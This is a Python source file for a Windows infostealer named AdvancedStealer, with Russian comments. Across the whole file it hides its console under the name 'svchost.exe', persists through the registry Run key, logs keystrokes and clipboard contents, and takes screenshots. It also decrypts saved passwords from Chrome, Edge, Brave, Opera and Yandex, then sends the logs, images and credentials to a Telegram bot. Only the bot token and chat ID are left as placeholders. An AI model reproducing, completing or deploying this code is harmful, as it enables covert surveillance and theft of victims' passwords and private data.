# ========== ИМПОРТЫ ==========
import keyboard as kb
import time
import requests
import threading
import os
import sys
import json
import base64
import sqlite3
import shutil
from datetime import datetime
from PIL import ImageGrab
import pyperclip
from Crypto.Cipher import AES
import ctypes
import winreg
import win32crypt

CONFIG = {
    "TOKEN": "BOT_ID",
    "CHAT_ID": "USER_ID",
    "SEND_INTERVAL": 10,
    "LOG_FILE": "log.txt",
    "SCREENSHOT_INTERVAL": 300,
    "PASSWORDS_INTERVAL": 600
}

try:
    ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

class AdvancedStealer:
    def __init__(self):
        self.word = ""
        self.first_run = True
        self.add_to_startup()
        self.browser_paths = {
            'chrome': os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data',
            'edge': os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data',
            'brave': os.path.expanduser('~') + r'\AppData\Local\BraveSoftware\Brave-Browser\User Data',
            'opera': os.path.expanduser('~') + r'\AppData\Roaming\Opera Software\Opera Stable',
            'yandex': os.path.expanduser('~') + r'\AppData\Local\Yandex\YandexBrowser\User Data'
        }
    
    def add_to_startup(self):
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsService", 0, winreg.REG_SZ, sys.executable)
        except:
            pass
    
    def get_system_info(self):
        info = []
        info.append(f"PC: {os.getenv('COMPUTERNAME', 'Unknown')}")
        info.append(f"User: {os.getenv('USERNAME', 'Unknown')}")
        info.append(f"OS: {sys.platform}")
        try:
            info.append(f"IP: {requests.get('https://api.ipify.org', timeout=3).text}")
        except:
            info.append("IP: Unknown")
        
        with open(CONFIG["LOG_FILE"], "a", encoding='utf-8') as f:
            f.write(f"\n{'='*20} SYSTEM INFO {time.ctime()} {'='*20}\n")
            f.write("\n".join(info))
            f.write(f"\n{'='*60}\n\n")
    
    def send_telegram(self):
        while True:
            time.sleep(CONFIG["SEND_INTERVAL"])
            try:
                # Отправка лога
                if os.path.exists(CONFIG["LOG_FILE"]) and os.path.getsize(CONFIG["LOG_FILE"]) > 100:
                    with open(CONFIG["LOG_FILE"], "rb") as f:
                        response = requests.post(
                            f"https://api.telegram.org/bot{CONFIG['TOKEN']}/sendDocument",
                            data={"chat_id": CONFIG["CHAT_ID"]},
                            files={"document": f},
                            timeout=5
                        )
                        if response.status_code == 200:
                            open(CONFIG["LOG_FILE"], 'w').close()
                
                if int(time.time()) % CONFIG["SCREENSHOT_INTERVAL"] < 30:
                    self.take_screenshot()
                
                if int(time.time()) % CONFIG["PASSWORDS_INTERVAL"] < 30:
                    self.steal_passwords()
                    
            except:
                pass
    
    # ===== 4. СКРИНШОТ =====
    def take_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            filename = f"screen_{int(time.time())}.png"
            screenshot.save(filename)
            with open(filename, "rb") as f:
                requests.post(
                    f"https://api.telegram.org/bot{CONFIG['TOKEN']}/sendPhoto",
                    data={"chat_id": CONFIG["CHAT_ID"], "caption": f"📸 Screenshot {time.ctime()}"},
                    files={"photo": f},
                    timeout=5
                )
            os.remove(filename)
        except:
            pass
    
    # ===== 5. КРАЖА ПАРОЛЕЙ =====
    def get_master_key(self, path):
        try:
            with open(os.path.join(path, 'Local State'), 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            return None
    
    def decrypt_password(self, ciphertext, master_key):
        try:
            iv = ciphertext[3:15]
            payload = ciphertext[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            return decrypted[:-16].decode('utf-8', errors='ignore')
        except:
            return "[ERROR]"
    
    def steal_passwords(self):
        all_passwords = []
        
        for browser, path in self.browser_paths.items():
            if not os.path.exists(path):
                continue
            
            login_db = os.path.join(path, 'Default', 'Login Data')
            if not os.path.exists(login_db):
                continue
            
            temp_db = os.path.join(os.environ['TEMP'], f'{browser}_login.db')
            try:
                shutil.copy2(login_db, temp_db)
                master_key = self.get_master_key(path)
                
                if master_key:
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                    
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        if username and encrypted_password:
                            password = self.decrypt_password(encrypted_password, master_key)
                            all_passwords.append({
                                'browser': browser,
                                'url': url,
                                'username': username,
                                'password': password
                            })
                    conn.close()
            except Exception as e:
                pass
            
            try:
                os.remove(temp_db)
            except:
                pass
        
        if all_passwords:
            filename = f"passwords_{int(time.time())}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("="*60 + "\n")
                f.write(f"🔑 STEALED PASSWORDS - {datetime.now()}\n")
                f.write("="*60 + "\n\n")
                
                for pwd in all_passwords[:50]:
                    f.write(f"Браузер: {pwd['browser']}\n")
                    f.write(f"URL: {pwd['url'][:100]}\n")
                    f.write(f"Логин: {pwd['username']}\n")
                    f.write(f"Пароль: {pwd['password']}\n")
                    f.write("-"*40 + "\n\n")
            
            with open(filename, "rb") as f:
                requests.post(
                    f"https://api.telegram.org/bot{CONFIG['TOKEN']}/sendDocument",
                    data={"chat_id": CONFIG["CHAT_ID"], "caption": f"🔑 Паролей: {len(all_passwords)}"},
                    files={"document": f},
                    timeout=5
                )
            os.remove(filename)
    
    def on_press(self, e):
        key = e.name
        
        if self.first_run:
            self.get_system_info()
            self.first_run = False
        
        if len(key) == 1:
            self.word += key
            # Перехват Ctrl+C
            if key == 'c' and kb.is_pressed('ctrl'):
                try:
                    clipboard = pyperclip.paste()
                    if clipboard:
                        with open(CONFIG["LOG_FILE"], "a", encoding='utf-8') as f:
                            f.write(f"{time.ctime()} [📋 CLIPBOARD] : {clipboard}\n")
                except:
                    pass
            return
        
        with open(CONFIG["LOG_FILE"], "a", encoding='utf-8') as f:
            if key == "space" and self.word.strip():
                f.write(f"{time.ctime()} : {self.word}\n")
                self.word = ""
            elif key == "enter" and self.word.strip():
                f.write(f"{time.ctime()} : {self.word} [⏎ ENTER]\n")
                self.word = ""
            elif key == "backspace":
                self.word = self.word[:-1]
            elif key == "tab":
                self.word += " [↹ TAB] "
            elif key == "esc":
                return False
    
    def run(self):
        self.get_system_info()
        
        threading.Thread(target=self.send_telegram, daemon=True).start()
        
        kb.on_press(self.on_press)
        kb.wait()

if __name__ == "__main__":
    try:
        stealer = AdvancedStealer()
        stealer.run()
    except Exception as e:
        pass
